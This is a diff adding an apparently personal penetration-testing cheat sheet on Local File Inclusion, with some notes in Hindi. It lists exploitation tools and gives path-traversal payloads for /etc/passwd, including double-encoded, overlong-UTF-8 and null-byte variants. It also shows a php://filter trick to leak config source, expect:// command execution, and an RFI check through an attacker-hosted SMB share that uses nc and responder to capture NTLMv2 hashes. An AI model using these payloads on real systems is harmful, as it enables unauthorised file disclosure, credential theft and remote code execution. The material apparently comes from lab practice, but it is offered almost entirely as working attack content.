@@ -1,0 +1,69 @@
+
+https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/
+
+tools - dotdotpwn
+lfisuite tool from github 
+A interesting tool to exploit this vulnerability: https://github.com/kurobeats/fimap    
+ 
+If LFI found on system try to fetch common windows file like
+/windows/system32/license.rtf
+/windows/pather/unattend.xml
+
+2. In case if you are not getting anything sensitive information or not able to exploit it,
+go for RFI by hosting a local SMB server and confirm it by running nc on 445 eg.
+http://example.php?file=\\10.10.14.111\htb\file.txt
+nc -lvnp 445
+If receive hits on nc it means it is vulnerable to RFI.
+
+3. Also run responder and try to get a NTLMv2 hash
+responder -I eth0
+
+4. Use tcpdump to verify
+tcpdump -i eth0 port 445    
+    
+    
+Local File Inclusion 
+
+http://example.com/index.php?page=index.php         asia file chiye parameter value me to hi lfi hoga
+
+http://example.com/index.php?page=../../../etc/passwd   
+
+
+common parameter look on
+file, document, folder, root, path, pg, style, pdf, template, php_path, doc
+dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain,
+callback, return, page, feed, port, host, to, out, view, dir, show, navigation, open
+4) lfi - /var/www/html/ & /etc/passwd
+../../etc/passwd
+  
+ 
+
+use  Encoding        #for encoding double encoding  check mastering morden web penetest
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+
+
+
+php://filter#
+You found a LFI, you included the file but you can't see its content?
+
+Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers.
+
+A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it.
+
+
+
+expect://#
+A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, an extension needs to be installed.
+
+1
+http://example.com/index.php?file=expect://ls
+
+
+
+                  
+    
+    
+    
